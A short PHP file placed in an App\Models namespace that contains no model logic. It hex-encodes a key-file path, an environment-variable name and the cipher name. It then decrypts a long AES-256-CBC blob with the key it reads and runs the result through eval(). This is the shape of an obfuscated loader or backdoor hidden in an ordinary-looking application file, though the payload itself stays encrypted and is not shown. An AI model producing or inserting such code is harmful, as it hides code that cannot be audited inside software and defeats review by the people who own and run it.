<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7gCNhd0jgrQqDfmZuERiHg==');

$c=base64_decode(

'I0Y0U+IRm4WqChJuUujUaQNjKJed0H4Vb+Am9crR0yVLonFAysv9djacIhbXAO1I/5A4qdkNxTK/' .
'oIHB/ah4EtgLREJD8PfV6qaxcNDnev4HEWmEjREsxIrUBhVh84E7u4cH62elCiqNRmq9OwV5lwtu' .
'M7sAE7hpnMSuE7N8ZoTmt17cS1AfKI1OTOSz/hf7whtyP3MFMa51nUZH6+fdeQq85YxmkTPC4SQ/' .
'fu/cDNW/xesy1bMc+sROLy/qhPGA/YZwxyIWJ+sSIRiQUopQjgzS4Yq/Nu/WmqafJiIl/EmYNJPo' .
'muSwwiLFMRnxfFkaAlmeYr4Bwu2GRcvZe6mH1sAjyhNsnaJDJKYYhjGijdZCjP+v69dP0DgTobS6' .
'U68FJVD5haikumlmkp3FrduDSb1bozY+MAVUnqPf0RE2PG8F4f8gqIXvIPkqj7xXvNmPJisv7Mnc' .
'uI7UUppv/b33e/tvRyjTGhIH9WGaIYLoanK/EFaFmDMzNTDwOlwHApFd+kjufK3vci92QUSzLkiy' .
'cCiRMZs2uHus3yCtWLQ16jWy5ArPGn0VPhS7g8KVJ2gZmNxZPgvDRXXM1blYTefapcPg7p7fkSzS' .
'2TPJe4OywpnHSYEK9LnQkjAfQGdsdDD6kiL3drGImmkYDc2BheWcubbdHuF1l/t0QLixPCVG8pE/' .
'4Odg5cjXh66jZ8Lj02xCR6f0FLZRlv7RyqD/02jIUUXAuV+H5EsVNvKeSF3BLiwuWbw5Iwl7a5Zx' .
'67H6krhqSBMOiITFdM75i1GbXnRiLeQJA/UGkvmMaUeI3mskjDJrcTqjjSQzOnKBmPIu27VsUFCo' .
'oVfiKjM2GO9FqCSp/JuwJSQ0pp3ShP0V/YkWgfthRdJdZYdy5mNqVT8i/xmmKDV+zjpXfWtxlQs4' .
'd/6LoWdcUh6Tex7uA8zp2rI0WxK7MFp5jHxzGsz+YcU6CH6zLyhKQuqFXwh7NdlisEKXm9P2qTsP' .
'qCQ1BTlcKYawCnvtyAkZ0HXqALThBksd6QF8AeCJGb4oRXRzpv3GCJnxYvs9zflv5ziOWO+rWQpP' .
'jo6iaJzJq1iYFM52ryGdO0RysAUt+tHRsJMKr6ETOUClf473HLdk9S0SdR2ArJe0Ywid0q0/+4Am' .
'zHDP2SI5pcQ4xgOyY/1P7/WeuDjNdpYbf0Cep0mppxnOytpJjnzVtyNIBz4YTYuvJ35uPELAAx4O'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

